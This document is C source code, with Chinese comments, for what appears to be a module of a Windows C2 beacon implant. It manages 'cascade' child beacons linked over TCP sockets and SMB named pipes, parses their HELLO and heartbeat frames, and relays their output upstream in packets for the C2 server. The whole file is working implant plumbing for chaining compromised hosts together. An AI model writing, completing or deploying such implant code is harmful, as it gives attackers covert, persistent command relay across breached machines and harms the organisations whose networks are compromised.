#include "beacon_cascade_internal.h"

#include "beacon_commands.h"

/* 设置唤醒事件，通知主循环有新数据待处理 */
static VOID CascadeWake(BeaconContext* ctx)
{
    if (!ctx || !ctx->runtime.wake_event) return;

    if (ctx->api.pfnSetEvent) {
        ctx->api.pfnSetEvent(ctx->runtime.wake_event);
    } else {
        SetEvent(ctx->runtime.wake_event);
    }
}


/* 初始化级联管理器，关联 BeaconContext */
VOID CascadeInit(CascadeManager* cm, BeaconContext* ctx)
{
    if (!cm) return;

    ZeroMemory(cm, sizeof(*cm));
    InitializeCriticalSection(&cm->lock);
    cm->ctx = ctx;
}

/* 释放单个级联通道：关闭 I/O、等待线程、释放内存 */
static VOID CascadeFreeChannel(CascadeChannel* ch)
{
    if (!ch) return;

    InterlockedExchange((LONG*)&ch->active, 0);
    CascadeIoClose(&ch->io);
    CascadeFrameReaderFree(&ch->frame_reader);
    if (ch->thread) {
        WaitForSingleObject(ch->thread, 1000);
        CloseHandle(ch->thread);
    }
    HeapFree(GetProcessHeap(), 0, ch);
}

/* 从链表中分离已完成（active==0）的通道，需持锁调用 */
static CascadeChannel* CascadeDetachFinishedLocked(CascadeManager* cm)
{
    CascadeChannel* list = NULL;
    CascadeChannel** tail = &list;
    CascadeChannel** pp = &cm->channels;

    while (*pp) {
        CascadeChannel* ch = *pp;
        if (!InterlockedCompareExchange((LONG*)&ch->active, 0, 0)) {
            *pp = ch->next;
            ch->next = NULL;
            *tail = ch;
            tail = &ch->next;
            continue;
        }
        pp = &ch->next;
    }
    return list;
}

/* 释放整个通道链表 */
static VOID CascadeFreeChannelList(CascadeChannel* list)
{
    while (list) {
        CascadeChannel* next = list->next;
        list->next = NULL;
        CascadeFreeChannel(list);
        list = next;
    }
}

/* 清理已完成的通道：加锁分离后在锁外释放 */
static VOID CascadeCleanupFinished(CascadeManager* cm)
{
    CascadeChannel* list;

    if (!cm) return;

    EnterCriticalSection(&cm->lock);
    list = CascadeDetachFinishedLocked(cm);
    LeaveCriticalSection(&cm->lock);

    CascadeFreeChannelList(list);
}

/* 释放级联管理器：关闭所有通道和待处理队列，销毁临界区 */
VOID CascadeFree(CascadeManager* cm)
{
    CascadeChannel* ch;
    CascadePending* p;

    if (!cm) return;

    EnterCriticalSection(&cm->lock);
    ch = cm->channels;
    cm->channels = NULL;
    p = cm->pending_head;
    cm->pending_head = NULL;
    cm->pending_tail = NULL;
    cm->pending_count = 0;
    LeaveCriticalSection(&cm->lock);

    while (ch) {
        CascadeChannel* next = ch->next;
        CascadeFreeChannel(ch);
        ch = next;
    }

    EnterCriticalSection(&cm->lock);
    if (cm->pending_head) {
        if (!p) {
            p = cm->pending_head;
        } else {
            CascadePending* tail = p;
            while (tail->next) tail = tail->next;
            tail->next = cm->pending_head;
        }
        cm->pending_head = NULL;
        cm->pending_tail = NULL;
        cm->pending_count = 0;
    }
    LeaveCriticalSection(&cm->lock);

    while (p) {
        CascadePending* next = p->next;
        BbFree(&p->packet);
        HeapFree(GetProcessHeap(), 0, p);
        p = next;
    }

    DeleteCriticalSection(&cm->lock);
    ZeroMemory(cm, sizeof(*cm));
}

/* 入队一个 FINAL 数据包到待处理队列尾部，并唤醒主循环 */
static VOID CascadeQueueFinal(CascadeManager* cm, UINT32 command_id, const ByteBuf* payload)
{
    CascadePending* p;
    ByteBuf final;

    if (!cm || !payload) return;

    final = PacketMakeFinal(0, command_id, payload);
    p = (CascadePending*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*p));
    if (!p) {
        BbFree(&final);
        return;
    }
    p->packet = final;

    EnterCriticalSection(&cm->lock);
    if (cm->pending_tail) {
        cm->pending_tail->next = p;
    } else {
        cm->pending_head = p;
    }
    cm->pending_tail = p;
    ++cm->pending_count;
    LeaveCriticalSection(&cm->lock);

    CascadeWake(cm->ctx);
}

/* 入队 CASCADE_OPEN 消息：通知上层有新的子通道连接 */
static VOID CascadeQueueOpen(CascadeManager* cm, const CHAR* child_id, const CHAR* protocol,
                             const CHAR* hint, const ByteBuf* hello)
{
    ByteBuf p;
    ByteBuf hb;

    BbInit(&p);
    hb = PacketPackBytes(hello);
    PacketArrayString(&p, child_id);
    PacketArrayString(&p, protocol);
    PacketArrayString(&p, hint);
    PacketArrayBytes(&p, hb.data, hb.len);
    BbFree(&hb);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_OPEN, &p);
    BbFree(&p);
}

/* 入队 CASCADE_READ 消息：将子通道收到的数据转发给上层 */
static VOID CascadeQueueRead(CascadeManager* cm, const CHAR* child_id, const ByteBuf* data)
{
    ByteBuf p;
    ByteBuf packed;

    BbInit(&p);
    packed = PacketPackBytes(data);
    PacketArrayString(&p, child_id);
    PacketArrayBytes(&p, packed.data, packed.len);
    BbFree(&packed);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_READ, &p);
    BbFree(&p);
}

/* 入队 CASCADE_DEAD 消息：通知上层子通道已断开 */
VOID CascadeQueueDead(CascadeManager* cm, const CHAR* child_id, const CHAR* reason)
{
    ByteBuf p;

    BbInit(&p);
    PacketArrayString(&p, child_id);
    PacketArrayString(&p, reason ? reason : "");
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_DEAD, &p);
    BbFree(&p);
}

/* 入队 CASCADE_PING 消息：转发子通道心跳数据 */
static VOID CascadeQueuePing(CascadeManager* cm, const CHAR* child_id, const ByteBuf* data)
{
    ByteBuf p;
    ByteBuf packed;

    BbInit(&p);
    packed = PacketPackBytes(data);
    PacketArrayString(&p, child_id);
    PacketArrayBytes(&p, packed.data, packed.len);
    BbFree(&packed);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_PING, &p);
    BbFree(&p);
}

/*
 * 启动一次异步管道读。
 * 返回 0 表示失败，1 表示 I/O 挂起，2 表示立即完成。
 */
static INT CascadeStartPipeRead(CascadeIo* io, DWORD* immediate_read)
{
    DWORD read_bytes;

    if (immediate_read) *immediate_read = 0;
    if (!io || io->kind != CASCADE_IO_PIPE || io->pipe == INVALID_HANDLE_VALUE) return 0;
    if (!io->read_event) return 0;
    ResetEvent(io->read_event);
    ZeroMemory(&io->read_olap, sizeof(io->read_olap));
    io->read_olap.hEvent = io->read_event;
    if (!ReadFile(io->pipe, io->read_buf, sizeof(io->read_buf), &read_bytes, &io->read_olap)) {
        if (GetLastError() == ERROR_IO_PENDING) {
            io->read_pending = TRUE;
            return 1;
        }
        return 0;
    }
    if (read_bytes == 0) return 0;
    io->read_pending = FALSE;
    if (immediate_read) *immediate_read = read_bytes;
    return 2;
}

/*
 * 帧分发：将原始数据喂入帧解析器，按命令类型入队。
 * RESULT → CascadeQueueRead，PING → CascadeQueuePing，CLOSE → 断开通道。
 */
static INT CascadeFeedChannelFrames(CascadeManager* cm, CascadeChannel* ch,
                                     const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        UINT16 cmd = 0;
        ByteBuf body;
        INT consumed;

        BbInit(&body);
        consumed = CascadeFrameReaderFeed(&ch->frame_reader, data + off, len - off, &cmd, &body);
        if (consumed < 0) return -1;
        if (consumed == 0) break;
        off += (SIZE_T)consumed;
        if (cmd == 0) continue;

        if (cmd == CASCADE_FRAME_RESULT) {
            CascadeQueueRead(cm, ch->child_id, &body);
        } else if (cmd == CASCADE_FRAME_PING) {
            CascadeQueuePing(cm, ch->child_id, &body);
        } else if (cmd == CASCADE_FRAME_CLOSE) {
            BbFree(&body);
            return -1;
        } else {
            BbFree(&body);
        }
    }
    return 0;
}

/*
 * 单通道事件驱动泵：检查 TCP/Pipe 事件并处理收到的数据。
 * TCP 使用 WSA 事件，Pipe 使用 overlapped I/O 完成通知。
 */
static VOID CascadePumpChannel(CascadeManager* cm, CascadeChannel* ch)
{
    CascadeIo* io = &ch->io;

    if (io->kind == CASCADE_IO_TCP) {
        WSANETWORKEVENTS net_events;

        if (WaitForSingleObject(CascadeIoEvent(io), 0) != WAIT_OBJECT_0) return;

        ZeroMemory(&net_events, sizeof(net_events));
        if (WSAEnumNetworkEvents(io->sock, io->event, &net_events) == SOCKET_ERROR) {
            InterlockedExchange((LONG*)&ch->active, 0);
            CascadeQueueDead(cm, ch->child_id, "tcp event error");
            return;
        }
        if (net_events.lNetworkEvents & FD_READ) {
            BYTE8 buf[8192];
            INT n;

            for (;;) {
                n = recv(io->sock, (CHAR*)buf, sizeof(buf), 0);
                if (n > 0) {
                    if (CascadeFeedChannelFrames(cm, ch, buf, (SIZE_T)n) < 0) {
                        InterlockedExchange((LONG*)&ch->active, 0);
                        CascadeQueueDead(cm, ch->child_id, "frame error");
                        return;
                    }
                } else if (n == 0) {
                    InterlockedExchange((LONG*)&ch->active, 0);
                    CascadeQueueDead(cm, ch->child_id, "tcp closed");
                    return;
                } else {
                    if (WSAGetLastError() == WSAEWOULDBLOCK) break;
                    InterlockedExchange((LONG*)&ch->active, 0);
                    CascadeQueueDead(cm, ch->child_id, "tcp recv error");
                    return;
                }
            }
        }
        if (net_events.lNetworkEvents & FD_CLOSE) {
            InterlockedExchange((LONG*)&ch->active, 0);
            CascadeQueueDead(cm, ch->child_id, "tcp closed");
            return;
        }
    } else if (io->kind == CASCADE_IO_PIPE) {
        DWORD read_bytes;
        INT rc;

        if (io->read_pending) {
            if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) {
                if (GetLastError() == ERROR_IO_INCOMPLETE) return;
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe read error");
                return;
            }
            io->read_pending = FALSE;
            if (read_bytes == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe closed");
                return;
            }
            if (CascadeFeedChannelFrames(cm, ch, io->read_buf, read_bytes) < 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "frame error");
                return;
            }
        }

        for (;;) {
            rc = CascadeStartPipeRead(io, &read_bytes);
            if (rc == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe read start failed");
                return;
            }
            if (rc == 1) break;
            if (read_bytes == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe closed");
                return;
            }
            if (CascadeFeedChannelFrames(cm, ch, io->read_buf, read_bytes) < 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "frame error");
                return;
            }
        }
    }
}

/*
 * 轮询级联管理器：泵送所有活跃通道，收集待处理队列。
 * 返回待发送给 C2 的数据包列表。
 */
PacketList CascadePoll(CascadeManager* cm)
{
    PacketList out;
    CascadePending* p;
    CascadeChannel* ch;

    PlistInit(&out);
    out.items_are_final = 1;
    if (!cm) return out;

    EnterCriticalSection(&cm->lock);
    for (ch = cm->channels; ch; ch = ch->next) {
        if (ch->active) {
            CascadePumpChannel(cm, ch);
        }
    }
    LeaveCriticalSection(&cm->lock);

    EnterCriticalSection(&cm->lock);
    p = cm->pending_head;
    cm->pending_head = NULL;
    cm->pending_tail = NULL;
    cm->pending_count = 0;
    LeaveCriticalSection(&cm->lock);

    while (p) {
        CascadePending* next = p->next;
        ByteBuf moved = p->packet;
        BbInit(&p->packet);
        PlistAdd(&out, moved);
        HeapFree(GetProcessHeap(), 0, p);
        p = next;
    }
    CascadeCleanupFinished(cm);
    return out;
}

/* 按 child_id 查找活跃通道，需持锁调用 */
CascadeChannel* CascadeFindLocked(CascadeManager* cm, const CHAR* child_id)
{
    CascadeChannel* ch;

    for (ch = cm->channels; ch; ch = ch->next) {
        if (ch->active && strcmp(ch->child_id, child_id ? child_id : "") == 0) {
            return ch;
        }
    }
    return NULL;
}

/*
 * 注册新子通道：读取 HELLO 帧、创建通道结构、设置事件驱动 I/O。
 * 若已存在同名旧通道则替换之。返回操作结果文本。
 */
ByteBuf CascadeRegisterChannel(BeaconContext* ctx, const CHAR* child_id, UINT32 protocol,
                                      const CHAR* hint, CascadeIo* io)
{
    CascadeChannel* ch;
    ByteBuf hello_body;
    ByteBuf heartbeat;
    Parser hello_parser;
    CHAR* real_child_id;
    UINT16 cmd = 0;
    DWORD immediate_read = 0;

    if (!CascadeIoReadHelloFrame(io, &cmd, &hello_body) || cmd != CASCADE_FRAME_HELLO) {
        CascadeIoClose(io);
        return BbFromText("cascade child did not send HELLO");
    }

    ParserInit(&hello_parser, hello_body.data, hello_body.len);
    real_child_id = ParserString(&hello_parser);
    heartbeat = ParserBytes(&hello_parser);
    if (hello_parser.error[0]) {
        HeapFree(GetProcessHeap(), 0, real_child_id);
        BbFree(&hello_body);
        CascadeIoClose(io);
        return BbFromText("cascade child HELLO parse failed");
    }

    ch = (CascadeChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*ch));
    if (!ch) {
        HeapFree(GetProcessHeap(), 0, real_child_id);
        BbFree(&hello_body);
        BbFree(&heartbeat);
        CascadeIoClose(io);
        return BbFromText("cascade channel allocation failed");
    }

    strncpy_s(ch->child_id, sizeof(ch->child_id),
              real_child_id && real_child_id[0] ? real_child_id : (child_id ? child_id : ""),
              _TRUNCATE);
    strncpy_s(ch->hint, sizeof(ch->hint), hint ? hint : "", _TRUNCATE);
    ch->protocol = protocol;
    CascadeIoInit(&ch->io);
    ch->io.kind = io->kind;
    ch->io.sock = io->sock;
    ch->io.pipe = io->pipe;
    io->kind = CASCADE_IO_NONE;
    io->sock = INVALID_SOCKET;
    io->pipe = INVALID_HANDLE_VALUE;
    CascadeIoClose(io);
    ch->active = 1;
    ch->ctx = ctx;
    CascadeFrameReaderInit(&ch->frame_reader);

    if (ch->io.kind == CASCADE_IO_TCP) {
        if (!CascadeIoEnableTcpReadEvent(&ch->io)) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade tcp event setup failed");
        }
    } else if (ch->io.kind == CASCADE_IO_PIPE) {
        INT prc;
        if (!CascadeIoEnablePipeReadEvent(&ch->io)) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade pipe event setup failed");
        }
        prc = CascadeStartPipeRead(&ch->io, &immediate_read);
        if (prc == 0) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade pipe read start failed");
        }
    }

    EnterCriticalSection(&ctx->cascade.lock);
    {
        CascadeChannel* old = CascadeFindLocked(&ctx->cascade, ch->child_id);
        if (old) {
            old->active = 0;
            CascadeIoClose(&old->io);
        }
        ch->next = ctx->cascade.channels;
        ctx->cascade.channels = ch;
    }
    LeaveCriticalSection(&ctx->cascade.lock);

    CascadeQueueOpen(&ctx->cascade, ch->child_id,
                     protocol == CASCADE_PROTOCOL_TCP ? "tcp" : "smb",
                     ch->hint, &heartbeat);
    if (immediate_read > 0 &&
        CascadeFeedChannelFrames(&ctx->cascade, ch, ch->io.read_buf, immediate_read) < 0) {
        InterlockedExchange((LONG*)&ch->active, 0);
        CascadeQueueDead(&ctx->cascade, ch->child_id, "frame error");
    }
    BbFree(&hello_body);
    BbFree(&heartbeat);

    HeapFree(GetProcessHeap(), 0, real_child_id);
    return BbFromText("cascade child connected");
}

